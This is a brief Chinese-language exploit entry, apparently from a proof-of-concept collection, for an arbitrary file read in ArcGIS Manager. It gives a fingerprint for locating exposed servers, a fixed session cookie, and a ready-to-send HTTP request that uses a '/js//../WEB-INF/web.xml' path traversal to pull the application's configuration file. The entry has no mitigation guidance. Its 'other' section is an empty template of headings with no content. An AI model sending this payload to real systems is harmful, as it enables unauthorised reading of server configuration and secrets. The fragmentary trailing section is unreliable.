# ArcGISmanager存在任意文件读取漏洞

- **系统**：ArcGISmanager　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name=="ArcGIS"`
- **请求**：`GET /arcgis/ HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: rsaPublicKey=null; JSESSIONID=B469B7A5C37F7DA97D60C11D6656B2FD`

**请求体 / payload**
```
GET /arcgis/manager/3370/js//../WEB-INF/web.xml HTTP/1.1
Host: {hostname}
Cookie: rsaPublicKey=null; JSESSIONID=B469B7A5C37F7DA97D60C11D6656B2FD
```

**其他**
- ArcGIS manager存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * ArcGIS